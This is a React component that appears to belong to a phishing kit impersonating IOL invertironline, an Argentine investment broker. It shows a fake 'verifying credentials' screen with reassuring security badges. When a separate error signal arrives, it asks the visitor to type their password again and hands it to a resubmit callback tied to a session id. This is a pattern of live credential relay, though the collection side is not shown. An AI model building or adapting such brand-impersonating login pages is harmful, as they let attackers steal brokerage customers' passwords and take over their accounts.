import { useState, useCallback } from "react";
import { Eye, EyeOff, ShieldCheck, Lock, Wifi } from "lucide-react";
import IolLogo from "./IolLogo";

interface IolWaitingScreenProps {
  email: string;
  sessionId: string;
  errorMessage?: string;
  onPasswordResubmit: (password: string) => Promise<void>;
}

const IolWaitingScreen = ({ email, errorMessage, onPasswordResubmit }: IolWaitingScreenProps) => {
  const [retryPassword, setRetryPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleRetrySubmit = useCallback(async (e: React.FormEvent) => {
    e.preventDefault();
    if (!retryPassword.trim()) return;
    setLoading(true);
    await onPasswordResubmit(retryPassword);
    setRetryPassword("");
    setLoading(false);
  }, [retryPassword, onPasswordResubmit]);

  const avatarLetter = email ? email[0].toUpperCase() : "U";

  if (errorMessage) {
    return (
      <div className="w-full max-w-[440px]">
        <div className="rounded-2xl border border-red-100 bg-white overflow-hidden shadow-sm">
          <div className="h-1 w-full bg-gradient-to-r from-red-400 via-red-500 to-red-400" />
          <div className="px-7 py-7">
            <div className="flex items-center gap-3 mb-6">
              <IolLogo size="sm" />
              <span className="text-[11px] font-bold tracking-[0.12em] text-[#6b7280] uppercase">IOL invertironline</span>
            </div>
            <div className="flex flex-col items-center text-center mb-6">
              <div className="mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-red-50 border-2 border-red-100">
                <svg className="h-6 w-6 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </div>
              <h3 className="text-[16px] font-bold text-[#1a1464] mb-1">Contraseña incorrecta</h3>
              <p className="text-[13px] text-[#6b7280]">Ingresá tu contraseña nuevamente para continuar.</p>
            </div>
            <form onSubmit={handleRetrySubmit} className="flex flex-col gap-3">
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="Ingresá tu contraseña"
                  value={retryPassword}
                  onChange={(e) => setRetryPassword(e.target.value)}
                  autoFocus
                  disabled={loading}
                  className="w-full rounded-xl border border-[#c8cde8] bg-[#f8f9fb] px-4 py-3.5 pr-11 text-[14px] text-[#1a1464] outline-none transition-all placeholder:text-[#9da3c0] focus:border-[#4a3fcf] focus:ring-2 focus:ring-[#4a3fcf]/15 disabled:opacity-50"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3.5 top-1/2 -translate-y-1/2 text-[#9da3c0] hover:text-[#4a3fcf] transition-colors"
                >
                  {showPassword ? <Eye size={17} /> : <EyeOff size={17} />}
                </button>
              </div>
              <button
                type="submit"
                disabled={loading || !retryPassword.trim()}
                className="w-full rounded-xl bg-[#1a1464] py-3.5 text-[14px] font-bold text-white transition-all hover:bg-[#251e8a] active:scale-[0.98] disabled:opacity-50"
              >
                {loading ? (
                  <span className="flex items-center justify-center gap-2">
                    <svg className="h-4 w-4 animate-spin" viewBox="0 0 24 24" fill="none">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                    </svg>
                    Verificando...
                  </span>
                ) : "Reintentar"}
              </button>
            </form>
            <p className="mt-4 text-center text-[11px] text-[#9da3c0]">{email}</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="w-full max-w-[440px]">
      <div className="rounded-2xl bg-white overflow-hidden shadow-[0_4px_24px_-4px_rgba(26,20,100,0.12)] border border-[#e4e6f0]">
        <div className="h-1 w-full bg-gradient-to-r from-[#1a1464] via-[#4a3fcf] to-[#1a1464] bg-[length:200%_100%] animate-[gradient_2s_linear_infinite]" />
        <div className="px-7 pt-6 pb-7">
          <div className="flex items-center gap-3 mb-7">
            <IolLogo size="sm" />
            <span className="text-[11px] font-bold tracking-[0.12em] text-[#6b7280] uppercase">IOL invertironline</span>
          </div>
          <div className="flex flex-col items-center mb-6">
            <div className="relative mb-5">
              <div className="absolute inset-0 rounded-full bg-[#4a3fcf]/20 animate-ping" style={{ animationDuration: "1.8s" }} />
              <div className="absolute -inset-2 rounded-full border-2 border-[#4a3fcf]/20 animate-pulse" />
              <div className="relative flex h-16 w-16 items-center justify-center rounded-full bg-gradient-to-br from-[#1a1464] to-[#4a3fcf] shadow-lg shadow-[#1a1464]/25">
                <span className="text-[22px] font-bold text-white">{avatarLetter}</span>
              </div>
            </div>
            <h3 className="text-[17px] font-bold text-[#1a1464] mb-1.5">Verificando credenciales</h3>
            <p className="text-[13px] text-[#6b7280] text-center leading-relaxed max-w-[260px]">
              Por favor esperá mientras validamos tu acceso a la cuenta.
            </p>
          </div>
          <div className="flex items-center justify-center mb-6">
            <div className="flex items-center gap-2 rounded-full border border-[#d4d6ef] bg-[#f0f0fb] px-4 py-2">
              <div className="h-1.5 w-1.5 rounded-full bg-[#4a3fcf] animate-pulse" />
              <span className="text-[12px] font-medium text-[#4a3fcf] max-w-[220px] truncate">{email}</span>
            </div>
          </div>
          <div className="grid grid-cols-3 gap-2 mb-6">
            {[
              { icon: ShieldCheck, label: "Cifrado SSL" },
              { icon: Lock, label: "Datos seguros" },
              { icon: Wifi, label: "Conexión activa" },
            ].map(({ icon: Icon, label }) => (
              <div key={label} className="flex flex-col items-center gap-1.5 rounded-xl border border-[#e4e6f0] bg-[#f8f9fb] py-3 px-2">
                <Icon size={16} className="text-[#4a3fcf]" />
                <span className="text-[10px] font-medium text-[#6b7280] text-center leading-tight">{label}</span>
              </div>
            ))}
          </div>
          <div className="flex items-center justify-center gap-1.5">
            {[0, 150, 300].map((delay) => (
              <span key={delay} className="h-2 w-2 rounded-full bg-[#4a3fcf] animate-bounce" style={{ animationDelay: `${delay}ms` }} />
            ))}
          </div>
        </div>
      </div>
      <p className="mt-4 text-center text-[11px] text-[#9da3c0]">Este proceso puede tomar unos segundos · IOL invertironline</p>
    </div>
  );
};

export default IolWaitingScreen;
